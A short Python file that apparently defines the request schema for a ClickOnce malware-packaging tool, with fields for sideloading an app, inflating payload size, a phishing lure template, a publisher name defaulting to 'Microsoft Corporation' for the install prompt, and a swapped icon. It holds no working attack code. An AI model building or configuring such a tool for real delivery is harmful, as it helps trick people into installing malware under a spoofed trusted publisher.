"""
Base models defining incoming requests
"""

from pydantic import BaseModel

class CFCOPayload(BaseModel):
    """Model describing incoming POST request payload"""
    name: str               # Name of clickonce application
    action: list            # list of actions to perform
    sideload: str           # App to sideload
    inflate: int            # Size, in MBs, to inflate payload to
    phish_template: str = "it_portal"           # Phishing HTML template for the lure page
    publisher: str = "Microsoft Corporation"  # Publisher shown in UAC / install dialog
    description: str = ""                     # Product description in manifest
    icon: str = ""                            # Base64-encoded .ico to replace template icon